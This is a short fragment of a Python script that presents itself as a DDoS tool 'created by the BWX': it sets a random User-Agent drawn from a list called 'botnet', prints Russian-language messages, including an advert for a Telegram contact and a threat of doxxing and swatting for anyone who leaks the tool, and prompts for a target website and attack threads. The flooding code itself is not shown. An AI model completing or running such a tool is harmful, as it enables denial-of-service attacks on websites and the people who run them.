...
headers = {
    'User-Agent' : random.choice(botnet)
}
os.system("clear")
print("Хотите защитить свой сайт от дудоса? напишите мне - @Kejshsjsjs")
time.sleep(3)
os.system("clear")
print("Слив дудосера = деанон+сват")
time.sleep(5)
os.system("clear")
print("This is a ddos program created by the BWX ™\nVersion: PRIVATE🔐")
url = input("Сайт который надо задудосить: ")
threads = int(input("Мощность (default=700): "))
